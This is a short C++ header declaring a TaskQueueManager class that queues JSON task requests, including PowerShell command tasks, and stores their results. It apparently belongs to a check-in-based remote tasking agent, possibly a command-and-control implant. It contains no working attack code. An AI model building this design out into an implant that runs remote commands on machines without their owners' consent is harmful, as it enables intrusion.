#pragma once
#include <string>
#include <queue>
#include <variant>
#include "CheckinModels.h"
#include "Command.h"
#include "Task.h"

using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<bool>>;
using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;

class TaskQueueManager {
public:
	TaskQueueManager();
	bool HasPendingResult();
	bool HasPendingTask();
	void StoreTaskResult(Response);
	std::string GetTaskResult();
	void QueueTask(std::string);
	Request GetNextTask();
	Request ParseTaskRequest(const std::string& rawJson);
private:
	std::queue<Response> taskResults;
	std::queue<std::string> taskQueue;
};